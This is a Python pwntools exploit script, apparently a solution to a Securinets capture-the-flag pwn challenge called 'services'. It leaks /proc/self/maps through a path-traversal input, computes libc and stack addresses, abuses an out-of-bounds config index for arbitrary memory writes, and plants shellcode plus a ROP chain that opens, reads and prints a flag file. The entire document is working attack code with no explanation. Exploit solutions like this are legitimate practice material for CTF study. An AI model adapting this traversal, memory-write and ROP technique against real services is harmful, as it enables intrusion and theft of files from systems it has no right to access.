from pwn import *
from time import sleep

log = lambda txt, value=None : print(txt, ' '*(20 - len(txt)), ':', value) if value else print(txt)

libc = ELF('./libc.so.6')
context.binary = binary = ELF('./services')
p = remote("pwn.ctf.securinets.tn", 4444) # binary.process()

oldSendLineAfter = p.sendlineafter

def newSendAfter(x, y):
    sleep(0.5)
    oldSendLineAfter(x, y)
    

p.sendlineafter = newSendAfter

def readFile(path) -> bytes:
    if isinstance(path, str):
        path = path.encode()

    p.sendlineafter(b"Choice:", b"1")
    p.sendlineafter(b"Chat ID:", path)
    content = p.recvuntil(b"1. Read chat").decode()
    return content.replace('1. Read chat', '').strip()


def updateConfig(ind : int, value):
    if isinstance(value, str):
        value = value.encode()
    ind = str(ind).encode()

    p.sendlineafter(b"Choice:", b"2")
    p.sendlineafter(b"Config index:", ind)
    p.sendlineafter(b"New config:", value)


def backupMsg():
    p.sendlineafter(b"Choice:", b"3")


def fullMemoryWrite(ind_to_reach, value : bytes, offset=0):
    for i in range(len(value)//8+1):
        if len(value[8*i:8*(i+1)]) != 0:
            updateConfig(ind_to_reach+offset+i, value[8*i:8*(i+1)])



leak = readFile("../"*10 + "proc/self/maps").split('\n')
stack_start, stack_end = map(lambda x: int(x, 16), [x for x in leak if "[stack]" in x][0].split(' rw')[0].split('-'))
heap_start, heap_end = map(lambda x: int(x, 16), [x for x in leak if "[heap]" in x][0].split(' rw')[0].split('-'))
shell_start, shell_end = map(lambda x: int(x, 16), [x for x in leak if " rwxp " in x][0].split(' rwxp')[0].split('-'))
libc_base = int([x for x in leak if "libc." in x][0].split('-')[0], 16)
pie_base = int(leak[0].split('-')[0], 16)
config_adr = binary.sym['config'] + pie_base
shell_adr = shell_start + 0xa #+6# Const offset

log("Stack start", hex(stack_start))
log("Stack end", hex(stack_end))
log("Heap start", hex(heap_start))
log("Heap end", hex(heap_end))
log("Pie Base", hex(pie_base))
log("Libc Base", hex(libc_base))
log("Config adr", hex(config_adr))
log("Shell adr", hex(shell_adr))

# ind *8 + config_adr = start_stack
# ind = (start_stack - config_adr)/8
ind_stack = (stack_start - config_adr) / 8
ind_shell = (shell_adr - config_adr) / 8

log("Index to reach stack", ind_stack)
log("Index to reach shell", ind_shell)

ind_shell = int(ind_shell)
ind_stack = int(ind_stack)

shell_code = asm("""
    nop
    nop
    lea rsp, [rdi + 8*3]
    ret
""")

# __libc_csu_init+82 : pop rbx, rbp, r12, r13, r14, r15, ret
# __libc_csu_init+56 : mov    rdx,r14; mov    rsi,r13; mov    edi,r12d; call   QWORD PTR [r15+rbx*8];
pop_rdi = libc_base + 0x0000000000027725
pop_rsi = libc_base + 0x0000000000028ed9

rop_chaine = p64(pop_rdi)
rop_chaine += p64(stack_start + 0xa)
rop_chaine += p64(libc_base + 0x000000000007d052) # xor edx, edx; mov eax, edx; ret;
rop_chaine += p64(pop_rsi)
rop_chaine += p64(0)
#rop_chaine += p64(0)
rop_chaine += p64(libc_base + libc.symbols['open'])

rop_chaine += p64(pop_rdi)
rop_chaine += p64(0x20)
rop_chaine += p64(libc_base + 0x00000000000cf672) # 0x00000000000cf672: lea edx, [rdi + rdi*8]; lea rax, [rax + rdx*8]; ret; 
rop_chaine += p64(pop_rdi)
rop_chaine += p64(3) # 0, 1, 2: reserved, ==> 3 will be our file
rop_chaine += p64(pop_rsi)
rop_chaine += p64(stack_start+0x200) # save flag here
#rop_chaine += p64(0)
rop_chaine += p64(libc_base + libc.symbols['read'])

rop_chaine += p64(pop_rdi)
rop_chaine += p64(1)
rop_chaine += p64(libc_base + libc.symbols['write'])

log('Len shell', len(shell_code))

updateConfig(2, p64(stack_start))
updateConfig(9, p64(shell_adr))
fullMemoryWrite(ind_stack, b"backup: 1\0./flag\0")
fullMemoryWrite(ind_stack, rop_chaine, 3)
fullMemoryWrite(ind_shell, shell_code)

p.interactive()










